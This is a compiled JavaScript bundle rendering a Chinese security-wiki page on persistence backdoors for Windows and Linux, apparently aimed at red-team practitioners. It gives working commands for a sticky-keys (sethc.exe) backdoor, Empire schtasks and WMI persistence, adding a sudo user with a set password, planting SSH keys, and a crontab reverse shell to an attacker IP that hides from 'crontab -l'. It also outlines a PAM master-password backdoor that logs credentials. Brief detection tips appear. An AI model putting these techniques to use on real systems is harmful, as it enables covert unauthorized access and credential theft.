(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[28],{170:function(e,a,t){"use strict";t.r(a),function(e){t.d(a,"default",(function(){return d}));var n,c=t(95),s=(t(139),t(0),t(96));function b(){return(b=Object.assign||function(e){for(var a=1;a<arguments.length;a++){var t=arguments[a];for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n])}return e}).apply(this,arguments)}function o(e,a){if(null==e)return{};var t,n,c=function(e,a){if(null==e)return{};var t,n,c={},s=Object.keys(e);for(n=0;n<s.length;n++)t=s[n],a.indexOf(t)>=0||(c[t]=e[t]);return c}(e,a);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(n=0;n<s.length;n++)t=s[n],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(c[t]=e[t])}return c}(n="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.enterModule:void 0)&&n(e);"undefined"!=typeof reactHotLoaderGlobal&&reactHotLoaderGlobal.default.signature;var r,p,l=function(e){return function(a){return console.warn("Component "+e+" was not imported, exported, or provided by MDXProvider as global scope"),Object(s.b)("div",a)}},m={},i="wrapper";function d(e){var a=e.components,t=o(e,["components"]);return Object(s.b)(i,b({},m,t,{components:a,mdxType:"MDXLayout"}),Object(s.b)("h1",{className:"__internal",id:"windows"},"Windows",Object(s.b)("a",b({parentName:"h1"},{href:"#windows","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("h2",{className:"__internal",id:"schtasks后门"},"Schtasks后门",Object(s.b)("a",b({parentName:"h2"},{href:"#schtasks%E5%90%8E%E9%97%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,"Schtasks.exe能够在本地或远程计算机上创建，删除，查询，更改，运行和结束计划任务"),Object(s.b)("p",null,"不带参数运行Schtasks.exe会显示每个已注册任务的状态和下一次运行时间。"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"Empire中的模块")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),"persistence/userland/schtasks\npersistence/elevated/schtasks*\t\t",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#需要管理员权限")))),Object(s.b)("p",null,"一个开源工具： ",Object(s.b)("a",b({parentName:"p"},{href:"https://github.com/fireeye/SharPersist",target:"_blank"}),"https://github.com/fireeye/SharPersist")," "),Object(s.b)("h2",{className:"__internal",id:"wmi后门"},"wmi后门",Object(s.b)("a",b({parentName:"h2"},{href:"#wmi%E5%90%8E%E9%97%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,"WMI后门使用了WMI的两个特征：",Object(s.b)("strong",{parentName:"p"},"无文件"),"和",Object(s.b)("strong",{parentName:"p"},"无进程"),"（需要管理员权限运行）。"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"原理是"),"：将代码加密存储与WMI中，即无文件；调用PowerShell执行后门程序，执行后进程消失，即无进程。"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"在Empire中使用Invoke-WMI模块")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),"usemodule powershell/persistence/elevated/wmi\t",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#设置参数run")))),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("strong",{parentName:"p"},"检查后门："),"使用微软提供的工具",Object(s.b)("inlineCode",{parentName:"p"},"Autoruns"),"："),Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("a",b({parentName:"p"},{href:"https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns",target:"_blank"}),"https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns")," ")),Object(s.b)("h2",{className:"__internal",id:"dll劫持后门"},"DLL劫持后门",Object(s.b)("a",b({parentName:"h2"},{href:"#dll%E5%8A%AB%E6%8C%81%E5%90%8E%E9%97%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,"DLL劫持原理就是使用 ",Object(s.b)("inlineCode",{parentName:"p"},"loadlibrary")," 动态加载DLL"),Object(s.b)("p",null,"DLL劫持工具：",Object(s.b)("a",b({parentName:"p"},{href:"https://github.com/anhkgg/SuperDllHijack",target:"_blank"}),"SuperDllHijack")),Object(s.b)("h2",{className:"__internal",id:"映像劫持shift后门"},"映像劫持shift后门",Object(s.b)("a",b({parentName:"h2"},{href:"#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81shift%E5%90%8E%E9%97%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"替换sethc.exe为cmd.exe")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(s.b)("pre",b({parentName:"div"},{className:"language-text"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-text"}),"CD C:\\windows\\system32cacls sethc.exe /t /e /G Administrators:fcacls cmd.exe /t /e /G Administrators:fren sethc.exe aaa.exeren cmd.exe sethc.exe#恢复ren sethc.exe cmd.exeren aaa.exe sethc.exe"))),Object(s.b)("p",null,"连按5下Shift弹出cmd窗口"),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("strong",{parentName:"p"},"检查后门"),"：连续按5下弹出cmd窗口（当然还有其它放大镜讲述人等）")),Object(s.b)("p",null,"扩展：",Object(s.b)("a",b({parentName:"p"},{href:"https://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247487783&idx=2&sn=cb335f8dca5b6581fc11586731f9497c&chksm=fc3fa826cb48213020f6a7099c77e20ced8dea3ec7168eaafbd61076e5926dfb50504a1440ef&mpshare=1&scene=24&srcid=0803CzkQaDB0wtkjHH15juEz&sharer_sharetime=1596415561771&sharer_shareid=e5c8ca04ed8346aa6eb2c2579c812fb8&key=ebb412db45555e1d108502328e33bc9c942962e3758fffe56ea4b145cd5a40482e5c11095d5f4c0533bb5cda390e6b656c3173ab08b99f70f343d1a6556cead0ff62db0cbe4ebcc9eb2bff17e0f2063e&ascene=14&uin=MTUwNjgwNTkxMA%3D%3D&devicetype=Windows+10+x64&version=62090070&lang=zh_CN&exportkey=A%2FNthEySkLH2rBg28%2FoMtnk%3D&pass_ticket=lppPNqJhx8ZD573ypwsqgQ41%2F%2BJd%2B2avwvIfBnLfOjeNcQkihuzk3CgS%2F36Je%2Bnb",target:"_blank"}),"权限维持之打造不一样的映像劫持后门")),Object(s.b)("h1",{className:"__internal",id:"linux"},"Linux",Object(s.b)("a",b({parentName:"h1"},{href:"#linux","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("h2",{className:"__internal",id:"增加超级用户账号"},"增加超级用户账号",Object(s.b)("a",b({parentName:"h2"},{href:"#%E5%A2%9E%E5%8A%A0%E8%B6%85%E7%BA%A7%E7%94%A8%E6%88%B7%E8%B4%A6%E5%8F%B7","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("strong",{parentName:"p"},"如果系统不允许",Object(s.b)("inlineCode",{parentName:"strong"},"uid=0"),"的用户（",Object(s.b)("inlineCode",{parentName:"strong"},"root"),"）远程登录，可以添加一个普通用户，并将其加入sudoers"))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"增加用户")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"useradd")," phP        ",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#添加账户"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token builtin class-name"}),"echo")," qwesys514",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"!"),"Sec",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"|"),Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"passwd")," --stdin phP\t",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#设置密码(密码符合要密码强度策略)")))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"修改sudoers赋予sudo权限")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"chmod")," +w /etc/sudoers    ",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#赋予写入权限"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"vi")," /etc/sudoers\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"# Allow root to run any commands anywhere"),"\nroot    ",Object(s.b)("span",b({parentName:"code"},{className:"token assign-left variable"}),"ALL"),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"="),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),"ALL",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),"     ALL\nphP\t\t",Object(s.b)("span",b({parentName:"code"},{className:"token assign-left variable"}),"ALL"),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"="),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),"ALL",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),"     ALL\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#在root下方，添加sudo用户"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"chmod")," -w /etc/sudoers    ",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#撤销写入权限")))),Object(s.b)("p",null,"还可以修改/etc/passwd文件，把用户uid改为0。"),Object(s.b)("h2",{className:"__internal",id:"ssh公钥无密码登录"},"SSH公钥无密码登录",Object(s.b)("a",b({parentName:"h2"},{href:"#ssh%E5%85%AC%E9%92%A5%E6%97%A0%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),"ssh-keygen -t rsa    ",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#本机生成rsa公钥"),"\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#把id_rsa.pub写入服务端的authorized_keys中"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"chmod")," ",Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"600")," ~/.ssh/authorized_keys\n",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"chmod")," ",Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"700")," ~/.ssh\n",Object(s.b)("span",b({parentName:"code"},{className:"token builtin class-name"}),"echo")," ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),'"id_rsa.pub的内容"')," ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">")," ~/.ssh/authorized_keys\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#没有这个文件的话，就自己创建一个"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token builtin class-name"}),"cd")," ~/\n",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"mkdir")," .ssh\n",Object(s.b)("span",b({parentName:"code"},{className:"token builtin class-name"}),"cd")," .ssh\n",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"touch")," authorized_keys"))),Object(s.b)("h2",{className:"__internal",id:"crontab定时反弹shell"},"Crontab定时反弹shell",Object(s.b)("a",b({parentName:"h2"},{href:"#crontab%E5%AE%9A%E6%97%B6%E5%8F%8D%E5%BC%B9shell","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),"crontab -l",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),Object(s.b)("span",b({parentName:"code"},{className:"token builtin class-name"}),"printf")," ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),'"*/1 * * * * exec 9<> /dev/tcp/攻击者IP/8888;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;',Object(s.b)("span",b({parentName:"span"},{className:"token entity",title:"\\r"}),"\\r"),"no crontab for ",Object(s.b)("span",b({parentName:"span"},{className:"token variable"}),Object(s.b)("span",b({parentName:"span"},{className:"token variable"}),"`"),Object(s.b)("span",b({parentName:"span"},{className:"token function"}),"whoami"),Object(s.b)("span",b({parentName:"span"},{className:"token variable"}),"`")),"%100c",Object(s.b)("span",b({parentName:"span"},{className:"token entity",title:"\\n"}),"\\n"),'"'),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"|"),Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"crontab")," -\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#每分钟执行一次，并且crontab -l看不出来"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#这种要用crontab -e 进去查看并编辑才能看到")))),Object(s.b)("h2",{className:"__internal",id:"pam后门"},"PAM后门",Object(s.b)("a",b({parentName:"h2"},{href:"#pam%E5%90%8E%E9%97%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"}," ",Object(s.b)("strong",{parentName:"p"},"PAM （Pluggable Authentication Modules ）"),"是由Sun提出的一种认证机制。"),Object(s.b)("p",{parentName:"blockquote"},"它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开"),Object(s.b)("p",{parentName:"blockquote"},"使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式，而无需更改服务程序"),Object(s.b)("p",{parentName:"blockquote"},"同时也便于向系统中添加新的认证手段")),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"步骤：")),Object(s.b)("p",null,"1、获取目标系统所使用的PAM版本，下载对应版本的pam版本"),Object(s.b)("p",null,"2、解压缩，修改pam_unix_auth.c文件，添加万能密码"),Object(s.b)("p",null,"3、编译安装PAM"),Object(s.b)("p",null,"4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换"),Object(s.b)("p",null,"​\t\t即可使用万能密码登陆，并将用户名密码记录到文件中"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"排查PAM后门技巧：")),Object(s.b)("p",null,"1、通过Strace跟踪ssh"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"ps")," axu ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"|")," ",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"grep")," sshd\n",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"strace")," -o aa -ff -p PID\n",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"grep")," ",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"open")," aa* ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"|")," ",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"grep")," -v -e No -e null -e denied",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"|")," ",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"grep")," WR"))),Object(s.b)("p",null,"2、检查pam_unix.so的修改时间"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"stat")," /lib/security/pam_unix.so      ",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#32位"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"stat")," /lib64/security/pam_unix.so    ",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#64位")))),Object(s.b)("h2",{className:"__internal",id:"rootkit工具包"},"Rootkit工具包",Object(s.b)("a",b({parentName:"h2"},{href:"#rootkit%E5%B7%A5%E5%85%B7%E5%8C%85","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},"rootkit是一种特殊的恶意软件。三要素是：",Object(s.b)("strong",{parentName:"p"},"隐藏、操纵、收集数据"),"。"),Object(s.b)("p",{parentName:"blockquote"},"功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息"),Object(s.b)("p",{parentName:"blockquote"},"多见的rootkit一般都是木马、后门和其它恶意程序结合使用"),Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("strong",{parentName:"p"},"Rootkit通过加载特殊的驱动，修改系统内核，进而达到隐藏信息的目的")),Object(s.b)("p",{parentName:"blockquote"},"Rootkit是攻击者用来隐藏自己的踪迹和保留root访问权限的工具")),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"Rootkit类型")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),"固件Rootkit\n虚拟化Rootkit\n内核级Rootkit\n库级Rootkit\n应用级Rootkit"))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"Rootkit工具包列表"),"：",Object(s.b)("a",b({parentName:"p"},{href:"https://github.com/d30sa1/RootKits-List-Download",target:"_blank"}),"https://github.com/d30sa1/RootKits-List-Download"),"  （注意与",Object(s.b)("inlineCode",{parentName:"p"},"Centos"),"版本适配）"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"检测与防护：")),Object(s.b)("p",null,"rkhunter：",Object(s.b)("a",b({parentName:"p"},{href:"http://rkhunter.sourceforge.net/",target:"_blank"}),"http://rkhunter.sourceforge.net/")," "),Object(s.b)("p",null,"chkrootkit：",Object(s.b)("a",b({parentName:"p"},{href:"http://www.chkrootkit.org/download/",target:"_blank"}),"http://www.chkrootkit.org/download/")," "),Object(s.b)("p",null,"定期检查md5，对于找出的 Rootkit，最好的应对方法是擦除并重新安装系统"))}d.isMDXComponent=!0,d=Object(c.hot)(e)(d),(r="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.default:void 0)&&(r.register(l,"makeShortcode","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\os-shell.md"),r.register(m,"layoutProps","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\os-shell.md"),r.register(i,"MDXLayout","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\os-shell.md"),r.register(d,"MDXContent","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\os-shell.md")),(p="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.leaveModule:void 0)&&p(e)}.call(this,t(23)(e))}}]);